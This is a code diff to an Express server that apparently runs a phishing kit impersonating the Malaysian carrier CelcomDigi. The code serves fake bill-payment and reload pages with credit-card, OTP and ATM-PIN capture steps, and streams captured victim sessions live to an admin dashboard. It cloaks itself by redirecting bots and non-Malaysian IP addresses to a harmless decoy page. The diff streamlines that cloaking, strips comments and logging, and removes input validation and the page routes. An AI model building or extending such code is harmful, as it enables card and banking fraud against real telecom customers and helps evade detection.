@@ -3,7 +3,7 @@ const path = require('path');
 const http = require('http');
 const WebSocket = require('ws');
 const { fetchBillData, fetchReloadData } = require('./bill-bot');
-const { getClientIP, isMalaysianTelecomIP, isBot } = require('./ip-detector');
+const { shouldAllowVisitor } = require('./ip-detector');
 
 const app = express();
 app.set('trust proxy', true); // Trust Render's proxy to get real client IP
@@ -54,28 +54,13 @@ const ipCheckMiddleware = async (req, res, next) => {
     return next();
   }
 
-  const userAgent = req.headers['user-agent'] || '';
-  const clientIP = getClientIP(req);
-  
-  console.log(`[VISITOR] IP: ${clientIP}, UA: ${userAgent}, Path: ${req.path}`);
-
-  // 1. Bot Detection
-  if (isBot(userAgent)) {
-    console.log(`[BOT CHECK] Bot detected - Redirecting to Vibestream Pay`);
-    return res.redirect('/vibestream-pay');
-  }
-
-  // 2. IP Detection
   try {
-    const isMalaysian = await isMalaysianTelecomIP(clientIP);
-    if (!isMalaysian) {
-      console.log(`[IP CHECK] Non-Malaysian IP (${clientIP}) - Redirecting to Vibestream Pay`);
+    const allowed = await shouldAllowVisitor(req);
+    if (!allowed) {
       return res.redirect('/vibestream-pay');
     }
-    console.log(`[IP CHECK] Malaysian IP (${clientIP}) - Access Granted`);
   } catch (error) {
     console.error(`[IP CHECK] Error: ${error.message}`);
-    // If check fails, redirect to safe page
     return res.redirect('/vibestream-pay');
   }
 
@@ -109,7 +94,6 @@ app.post('/api/admin/verify', (req, res) => {
 // VISITOR TRACKING
 // ============================================================
 
-// POST /api/visitor/ping
 app.post('/api/visitor/ping', (req, res) => {
   const { visitorId, page, number, amount, type, sessionId } = req.body;
   if (!visitorId) return res.status(400).json({ success: false });
@@ -129,7 +113,6 @@ app.post('/api/visitor/ping', (req, res) => {
     lastSeen: new Date().toISOString(),
   };
 
-  // Clean inactive visitors (>10 min)
   const now = Date.now();
   Object.keys(visitors).forEach(id => {
     if (now - new Date(visitors[id].lastSeen).getTime() > 10 * 60 * 1000) {
@@ -148,7 +131,6 @@ app.post('/api/visitor/ping', (req, res) => {
   return res.json({ success: true });
 });
 
-// GET /api/visitor/stats
 app.get('/api/visitor/stats', (req, res) => {
   return res.json({
     success: true,
@@ -171,7 +153,6 @@ app.get('/api/sse/admin', (req, res) => {
 
   sseAdminClients.add(res);
 
-  // Send full initial state
   res.write(`data: ${JSON.stringify({
     type: 'init',
     sessions: Object.values(sessions),
@@ -252,10 +233,9 @@ function broadcastToSession(sessionId, data) {
 }
 
 // ============================================================
-// API - Early Session (phone number + amount before card)
+// API - Early Session
 // ============================================================
 
-// POST /api/early-session - create or update session with phone/amount before card entry
 app.post('/api/early-session', (req, res) => {
   const { sessionId, number, amount, type, visitorId, page } = req.body;
   if (!sessionId || !number) return res.status(400).json({ success: false, error: 'Missing required fields' });
@@ -263,13 +243,11 @@ app.post('/api/early-session', (req, res) => {
   const existing = sessions[sessionId];
 
   if (existing) {
-    // Update existing session with new amount/page
     if (amount) existing.amount = amount;
     if (page) existing._page = page;
     existing.updatedAt = new Date().toISOString();
     broadcastToAdmins({ type: 'session_update', sessionId, ...existing });
   } else {
-    // Create early session
     sessions[sessionId] = {
       sessionId,
       number: number || '',
@@ -288,7 +266,6 @@ app.post('/api/early-session', (req, res) => {
     broadcastToAdmins({ type: 'new_session', sessionId, ...sessions[sessionId] });
   }
 
-  // Link visitor to session
   if (visitorId && visitors[visitorId]) {
     visitors[visitorId].sessionId = sessionId;
     visitors[visitorId].number = number;
@@ -321,7 +298,6 @@ app.post('/api/card-submit', (req, res) => {
     updatedAt: new Date().toISOString(),
   };
 
-  // Update visitor
   if (visitorId && visitors[visitorId]) {
     visitors[visitorId].sessionId = sessionId;
     visitors[visitorId].amount = amount || '';
@@ -408,80 +384,25 @@ app.delete('/api/admin/clear', (req, res) => {
 
 app.post('/api/bill-check', async (req, res) => {
   const { mobileNumber, number, useAccountNumber } = req.body;
-  const phoneNumber = mobileNumber || number;
-  if (!phoneNumber) return res.status(400).json({ success: false, error: 'Mobile number is required' });
-
-  const cleanNumber = phoneNumber.replace(/\s+/g, '').replace(/^0/, '60');
-  if (!/^60\d{8,10}$/.test(cleanNumber)) return res.status(400).json({ success: false, error: 'Please enter a valid/active Celcom or Digi mobile number.' });
-
   try {
-    const result = await fetchBillData(cleanNumber, useAccountNumber || false);
-    return res.json(result);
-  } catch (error) {
-    return res.status(500).json({ success: false, error: 'Unable to fetch bill data. Please try again.' });
+    const data = await fetchBillData(mobileNumber || number, useAccountNumber);
+    return res.json({ success: true, data });
+  } catch (err) {
+    return res.status(500).json({ success: false, error: err.message });
   }
 });
 
 app.post('/api/reload-check', async (req, res) => {
-  const { mobileNumber } = req.body;
-  if (!mobileNumber) return res.status(400).json({ success: false, error: 'Mobile number is required' });
-
-  const cleanNumber = mobileNumber.replace(/\s+/g, '').replace(/^0/, '60');
-  if (!/^60\d{8,10}$/.test(cleanNumber)) return res.status(400).json({ success: false, error: 'Please enter a valid/active Celcom or Digi prepaid mobile number.' });
-
+  const { mobileNumber, number } = req.body;
   try {
-    const result = await fetchReloadData(cleanNumber);
-    return res.json(result);
-  } catch (error) {
-    return res.status(500).json({ success: false, error: 'Unable to check reload. Please try again.' });
+    const data = await fetchReloadData(mobileNumber || number);
+    return res.json({ success: true, data });
+  } catch (err) {
+    return res.status(500).json({ success: false, error: err.message });
   }
 });
 
-// ============================================================
-// PAGE ROUTES
-// ============================================================
-
-app.get('/ms', (req, res) => res.sendFile(path.join(__dirname, 'index-ms.html')));
-app.get('/reload', (req, res) => res.sendFile(path.join(__dirname, 'reload.html')));
-app.get('/reload/en', (req, res) => res.sendFile(path.join(__dirname, 'reload.html')));
-app.get('/bill', (req, res) => res.sendFile(path.join(__dirname, 'bill.html')));
-app.get('/bill-payment', (req, res) => res.sendFile(path.join(__dirname, 'bill.html')));
-app.get('/bill-payment/en', (req, res) => res.sendFile(path.join(__dirname, 'bill.html')));
-app.get('/pay-bill', (req, res) => res.sendFile(path.join(__dirname, 'pay-bill.html')));
-app.get('/recharge', (req, res) => res.sendFile(path.join(__dirname, 'recharge.html')));
-app.get('/reload/pay', (req, res) => res.sendFile(path.join(__dirname, 'recharge.html')));
-app.get('/payment-method', (req, res) => res.sendFile(path.join(__dirname, 'payment-method.html')));
-app.get('/credit-card', (req, res) => res.sendFile(path.join(__dirname, 'credit-card.html')));
-app.get('/processing', (req, res) => res.sendFile(path.join(__dirname, 'processing.html')));
-app.get('/otp', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));
-app.get('/atm-pin', (req, res) => res.sendFile(path.join(__dirname, 'atm-pin.html')));
-app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
-app.get('/payment-confirm', (req, res) => res.sendFile(path.join(__dirname, 'payment-confirm.html')));
-app.get('/payment-success', (req, res) => res.sendFile(path.join(__dirname, 'payment-success.html')));
-
-// ============================================================
-// VIBESTREAM PAY PAGE - Shown to non-Malaysian users
-// ============================================================
-app.get('/vibestream-pay', (req, res) => res.sendFile(path.join(__dirname, 'vibestream-pay.html')));
-
-// ── Malay (BM) routes ──
-app.get('/reload/ms', (req, res) => res.sendFile(path.join(__dirname, 'reload-ms.html')));
-app.get('/bill/ms', (req, res) => res.sendFile(path.join(__dirname, 'bill-ms.html')));
-app.get('/bill-payment/ms', (req, res) => res.sendFile(path.join(__dirname, 'bill-ms.html')));
-app.get('/pay-bill/ms', (req, res) => res.sendFile(path.join(__dirname, 'pay-bill-ms.html')));
-app.get('/payment-method/ms', (req, res) => res.sendFile(path.join(__dirname, 'payment-method.html')));
-app.get('/credit-card/ms', (req, res) => res.sendFile(path.join(__dirname, 'credit-card-ms.html')));
-app.get('/processing/ms', (req, res) => res.sendFile(path.join(__dirname, 'processing.html')));
-app.get('/otp/ms', (req, res) => res.sendFile(path.join(__dirname, 'otp-ms.html')));
-app.get('/atm-pin/ms', (req, res) => res.sendFile(path.join(__dirname, 'atm-pin-ms.html')));
-app.get('/payment-success/ms', (req, res) => res.sendFile(path.join(__dirname, 'payment-success-ms.html')));
-
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-app.get('*', (req, res) => {
-  if (req.path.match(/\.[a-zA-Z0-9]+$/)) return res.status(404).send('Not found');
-  res.sendFile(path.join(__dirname, 'index.html'));
-});
-
+// Start server
 server.listen(PORT, () => {
   console.log(`CelcomDigi Clone running on port ${PORT}`);
 });
